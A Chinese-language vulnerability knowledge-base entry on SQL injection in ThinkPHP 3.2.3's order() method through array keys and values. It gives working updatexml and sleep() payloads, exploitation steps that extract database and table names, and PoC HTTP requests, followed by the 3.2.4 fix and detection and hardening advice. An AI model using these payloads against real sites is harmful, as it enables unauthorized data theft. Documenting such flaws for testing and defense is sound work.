---
id: web-generic-sqli-thinkphp3-order-array-key-value-injection
title: ThinkPHP 3.2.3 order() 数组 key/value 注入：parseOrder 原样拼接 ORDER BY
type: scenario
domain: web
path: web/generic/sqli
technique: thinkphp3-order-array-key-value-injection
aliases:
- ThinkPHP order by 数组注入
- name[username]=payload
- parseOrder 注入
- parseKey 绕过
- order 键值拼接
- ORDER BY 报错注入
tags:
- php
- thinkphp
- thinkphp3
- sqli
- order-by
- array-injection
- parseorder
- error-based
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: ThinkPHP 3.2.3（文中修复于 3.2.4）
verification:
  verified_by: verifier-V422
  verified_at: '2026-11-09T17:02:55+08:00'
  notes: 已对照原文与6张图片核对：parseOrder 数组分支 parseKey(key).' '.value 原样拼接、parseKey 正则含空格/括号即跳过反引号、图06 确认 3.2.4 重写（拒绝括号/# 与方向白名单）；affected_versions『ThinkPHP 3.2.3（修复于 3.2.4）』有原文依据，保留。PoC 未在 TP3.2.3 环境实测；dedup top 候选 TP5 order 数组（CVE-2018-16385，key 进 field()）为不同版本/代码路径，非同一链。
---

## 一句话结论

ThinkPHP 3.2.3 的 `order()` 接受数组时，`parseOrder()` 对字符串键执行 `parseKey($key) . ' ' . $val`——key 只经过弱校验的 `parseKey()`，value 完全不转义；当 key 含空格/括号时 `parseKey()` 跳过反引号包装原样返回，value 又是任意字符串，于是 `?name[username]=and(updatexml(...))` 或 `?name[username and(updatexml(...))]=` 都能把 SQL 片段带进 `ORDER BY`，形成报错/时间盲注。

## 原理

- **入口**：控制器 `$order_by = I('Get.name'); $User->where('id=1')->order($order_by)->find();`。`I()` 允许数组，`name[username]=...` 解析为 `['username' => '...']` 存入 `options['order']`。
- **parseOrder 的数组分支**：`if (is_array($order)) { foreach ($order as $key => $val) { if (is_numeric($key)) { $array[] = $this->parseKey($val); } else { $array[] = $this->parseKey($key) . ' ' . $val; } } $order = implode(',', $array); }`。字符串键的 value 直接拼在后面，没有任何引号/转义/白名单。
- **parseKey 的弱校验**：`parseKey()` 先 `trim`；仅当 `!is_numeric($key)` 且 `!preg_match('/[,\'\"\*\(\)`.\s]/', $key)` 时才包反引号，否则原样返回。这个正则本意是判断“是否标识符”，却让含空格或括号的注入串直接通过。
- **payload 1（value 注入）**：`?name[username]=and(updatexml(1,concat(0x7e,(select database())),0))`。key `username` 无特殊字符 → `` `username` ``；value 原样追加 → `ORDER BY `username` and(updatexml(...))`。
- **payload 2（key 注入）**：`?name[username and(updatexml(1,concat(0x7e,(select database())),0))]=`。key 含空格与括号 → `parseKey()` 原样返回 → `ORDER BY username and(updatexml(...))`。
- **数字键变体**：`?name[]=username and(updatexml(...))` 走 `is_numeric($key)` 分支，`parseKey($val)` 对含空格的 val 同样原样返回，效果一致。
- **为什么能成立**：排序字段在 SQL 中属于标识符/表达式位置，无法用普通参数绑定；开发者通常只对字符串形式的 order 做“字段 asc/desc”假设，没料到数组的 key 和 value 都能被请求控制，`parseKey()` 又只是“是否加反引号”的格式判断而非安全校验。
- **修复**：3.2.4 重写了 `parseOrder()`：数组值含 `(`、key 含 `(`/`#` 时拒绝或跳过，方向只允许 `asc`/`desc` 白名单；字符串形式改为正则解析 `字段 asc|desc`，无法识别的片段不再原样拼接。

## 触发条件

- 目标为 ThinkPHP 3.2.3（修复于 3.2.4），控制器把用户可控的数组传给 `order()`（如 `order(I('name'))`、`order($_GET['order'])`）。
- 请求可用数组形式传参，且进入 `order()` 前没有被强制转成字符串/白名单校验。
- 查询本身可执行（如 `where('id=1')` 成立），数据库为 MySQL 且报错回显可用（`updatexml`）；关闭报错时可用 `sleep()` 时间盲注。
- 结果页面可回显查询结果或至少可观察排序/响应时间差异。

## 利用步骤

1. 确认参数被当数组处理：`?name[username]=asc` 与 `?name[username]=desc` 观察排序是否变化。
2. 判定注入：`?name[username]=and(1=1)` 与 `and(1=2)` 对比结果/报错；或直接发 `?name[username]=and(updatexml(1,concat(0x7e,user()),0))` 看是否出现 `XPATH syntax error`。
3. 若 value 位置被过滤，改用 key 位置：`?name[username and(updatexml(1,concat(0x7e,user()),0))]=`。
4. 逐段替换 `user()`/`database()` 为 `@@version`、`(select group_concat(table_name) from information_schema.tables where table_schema=database())` 取数。
5. 无回显时改为 `?name[username]=and(sleep(5))` 或按布尔排序结果判断，并注意 `ORDER BY` 后仍可能有 `LIMIT 1` 需要语法闭合。
6. 记录 payload、SQL 日志与响应差异，评估数据库权限。

## PoC

```http
GET /index.php?m=home&c=index&a=index&name[username]=and(updatexml(1,concat(0x7e,(select%20database())),0)) HTTP/1.1
Host: target
```

```sql
SELECT * FROM `users` WHERE id=1 ORDER BY `username` and(updatexml(1,concat(0x7e,(select database())),0)) LIMIT 1
```

```http
GET /index.php?m=home&c=index&a=index&name[username%20and(updatexml(1,concat(0x7e,(select%20database())),0))]= HTTP/1.1
Host: target
```

说明：示例用 `updatexml` 报错回显，关闭报错时改用 `sleep()`/布尔条件；路由前缀以目标应用为准。

## 变体与关联

- 数字键变体：`?name[]=username and(updatexml(...))`，走 `is_numeric($key)` 分支，`parseKey($val)` 同样可被特殊字符绕过。
- 多字段排序：数组可含多个键值，payload 可放在任意一项；`implode(',')` 后用逗号分隔，注意语法闭合。
- 与 ThinkPHP 5 的 `order()` 数组注入不同：TP5.1.23 之前是 key 进入 `field()` 拼接（CVE-2018-16385），TP3 是 key/value 直接拼 `ORDER BY`，版本与利用形态均不同。
- 关联：[[web-generic-sqli-thinkphp5-order-array-key-field-injection]]（TP5 order 数组 key 进 field()）、[[web-generic-sqli-thinkphp32-find-options-table-alias-injection]]（TP3 options table/alias 注入）、[[web-generic-sqli-thinkphp32-find-options-where-string-injection]]（TP3 options where 字符串注入）。
- 边界：升级 3.2.4+、把 order 参数强转字符串并做字段/方向白名单后失效。

## 检测与防御

- **代码层**：`order()` 只接受服务端生成的字段与方向；对用户输入做“字段白名单 + `asc`/`desc` 枚举”，禁止数组直接进入 `order()`。
- **框架层**：升级 ThinkPHP 3.2.4+；无法升级时在 `parseOrder()` 中拒绝含 `(`、`)`、`#`、空格、逗号的 key/value，或仅允许 `[a-zA-Z0-9_]+ (asc|desc)`。
- **检测**：访问日志出现 `name[`、`order[`、`sort[` 等数组参数；SQL 日志 `ORDER BY` 后出现 `(`、`updatexml`、`extractvalue`、`sleep`、`case when`；同一接口大量排序参数探测与异常响应时间。
- **加固**：生产关闭详细报错；数据库账号最小权限；WAF 对 ORDER BY 位置的函数/括号组合告警（仅缓解）。
